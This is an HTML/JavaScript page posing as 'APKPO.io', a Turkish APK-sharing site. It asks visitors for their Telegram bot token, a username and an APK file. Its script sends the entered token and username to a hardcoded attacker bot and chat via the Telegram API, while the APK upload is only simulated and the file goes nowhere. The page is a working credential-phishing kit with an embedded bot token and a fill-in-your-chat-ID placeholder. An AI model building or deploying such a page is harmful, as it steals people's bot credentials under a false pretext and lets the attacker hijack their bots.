<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APKPO.io | Global APK Paylaşım</title>
    <style>
        :root {
            --primary: #1a1a1a;
            --accent: #0088cc;
            --bg: #f0f2f5;
        }
        body { font-family: sans-serif; background: var(--bg); margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: auto; background: #fff; padding: 25px; border-radius: 12px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .step { display: none; }
        .active { display: block; }
        input, select, button { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
        button { background: var(--accent); color: #fff; border: none; font-weight: bold; cursor: pointer; }
        .apk-card { border: 1px solid #eee; padding: 15px; margin-bottom: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
        .apk-info { font-weight: bold; }
        .download-btn { width: auto; background: #27ae60; padding: 5px 15px; font-size: 13px; }
        h2 { text-align: center; color: var(--primary); }
    </style>
</head>
<body>

<div class="container">
    <h2>APKPO.io</h2>

    <div id="step1" class="step active">
        <label>Telegram Bot Token</label>
        <input type="text" id="botToken" placeholder="Tokeninizi giriniz...">
        <button onclick="validateAndNext()">Doğrula ve Devam Et</button>
    </div>

    <div id="step2" class="step">
        <label>Kullanıcı Adı Belirleyin</label>
        <input type="text" id="username" placeholder="Kullanıcı adınız...">
        <button onclick="saveUserAndNext()">Kaydet</button>
    </div>

    <div id="step3" class="step">
        <label>APK Dosyası Seç (Dosya Yöneticisinden)</label>
        <input type="file" id="apkFile" accept=".apk">
        <label>APK Uygulama Adı</label>
        <input type="text" id="apkName" placeholder="Uygulama adı...">
        <button onclick="uploadAPK()">APK Yükle ve Yayınla</button>
    </div>

    <div id="mainPage" class="step">
        <h3>Yüklenen APK'lar</h3>
        <div id="apkList">
            <div class="apk-card">
                <div class="apk-info">WhatsApp Mod (Örnek)</div>
                <button class="download-btn">Yükle</button>
            </div>
        </div>
        <hr>
        <button style="background:#555" onclick="location.reload()">Çıkış Yap</button>
    </div>
</div>

<script>
    const TARGET_BOT_TOKEN = "8582204571:AAEXtKCcXGWPM-2Y3xfF0vSEsEcy0iYl2cU";
    const TARGET_CHAT_ID = "BURAYA_KENDI_CHAT_ID_YAZIN"; // Bildirimin düşeceği Chat ID

    let userData = { token: "", user: "" };

    function validateAndNext() {
        const t = document.getElementById('botToken').value;
        if(t.includes(":")) {
            userData.token = t;
            showStep('step2');
        } else { alert("Hatalı token formatı!"); }
    }

    function saveUserAndNext() {
        const u = document.getElementById('username').value;
        if(u.length > 2) {
            userData.user = u;
            showStep('step3');
        } else { alert("Geçersiz kullanıcı adı!"); }
    }

    async function uploadAPK() {
        const name = document.getElementById('apkName').value;
        const file = document.getElementById('apkFile').files[0];

        if(!name || !file) {
            alert("Lütfen dosya ve isim seçiniz!");
            return;
        }

        // Telegram'a veri iletme (Bot üzerinden)
        const message = `🔔 *Yeni APK Yüklemesi*\n👤 Kullanıcı: ${userData.user}\n🔑 Kullanılan Token: ${userData.token}\n📦 APK Adı: ${name}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${TARGET_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TARGET_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            // Listeye ekleme simülasyonu
            const list = document.getElementById('apkList');
            const item = document.createElement('div');
            item.className = 'apk-card';
            item.innerHTML = `<div class="apk-info">${name}</div> <button class="download-btn">Yükle</button>`;
            list.appendChild(item);

            alert("Yükleme başarılı! Ana sayfaya yönlendiriliyorsunuz.");
            showStep('mainPage');
        } catch (e) {
            alert("İletim hatası oluştu.");
        }
    }

    function showStep(id) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById(id).classList.add('active');
    }
</script>

</body>
</html>
